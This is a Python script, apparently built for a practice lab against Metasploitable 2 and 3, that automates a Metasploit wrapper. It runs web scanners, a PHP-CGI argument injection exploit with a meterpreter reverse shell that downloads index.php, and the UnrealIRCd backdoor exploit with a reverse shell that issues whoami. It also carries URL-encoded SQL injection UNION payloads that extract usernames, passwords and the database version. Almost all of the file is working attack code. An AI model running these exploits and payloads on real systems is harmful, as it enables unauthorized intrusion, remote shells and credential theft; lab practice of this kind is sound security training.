try:
    from my_exploit.exploit import *
except:
    from exploit import *

# Metasploitable 2
metasploitable2 = "10.100.219.13"

def auxiliary_1():
    Exploit(
        name = "auxiliary_1",
        type = "auxiliary",
        exploit = "scanner/http/title",
        rhosts = metasploitable2
    ).send_command("run")

def auxiliary_2():
    Exploit(
        name = "auxiliary_2",
        type = "auxiliary",
        exploit = "scanner/http/dir_scanner",
        rhosts = metasploitable2
    ).send_command("run")

def auxiliary_3():
    Exploit(
        name = "auxiliary_3",
        type = "auxiliary",
        exploit = "scanner/http/files_dir",
        rhosts = metasploitable2
    ).send_command("run")

def exploit_1():
    Exploit(
        name = "exploit_1",
        type = "exploit",
        exploit = "multi/http/php_cgi_arg_injection",
        rhosts = metasploitable2,
        targeturi = "/phpinfo.php",
        payload = "php/meterpreter/reverse_tcp",
    ) \
    .send_command("run") \
    .send_command("download index.php")

# Metasploitable 3
metasploitable3 = "172.28.128.3"

def exploit_2():
    Exploit(
        name = "exploit_2",
        type = "exploit",
        exploit = "unix/irc/unreal_ircd_3281_backdoor",
        rhosts = metasploitable3,
        rport = "6697",
        exitonsession = "false",
        payload = "payload/cmd/unix/reverse",
    ) \
    .send_command("run") \
    .send_command("whoami") \
    .send_command("group")

def sql_injection_1():
    # admin' UNION SELECT username, NULL, NULL, NULL FROM users-- -
    return sql_injection(
        'sql_injection_1',
        r"admin'%20UNION%20SELECT%20username%2c%20NULL%2c%20NULL%2c%20NULL%20FROM%20users--%20-"
    )

def sql_injection_2():
    # admin' UNION SELECT VERSION(), NULL, NULL, NULL-- -
    return sql_injection(
        'sql_injection_2',
        r"admin'%20UNION%20SELECT%20VERSION()%2c%20NULL%2c%20NULL%2c%20NULL--%20-"
    )

def sql_injection_3():
    # admin' UNION SELECT password, NULL, NULL, NULL FROM users-- -
    return sql_injection(
        'sql_injection_3',
        r"admin'%20UNION%20SELECT%20password%2c%20NULL%2c%20NULL%2c%20NULL%20FROM%20users--%20-"
    )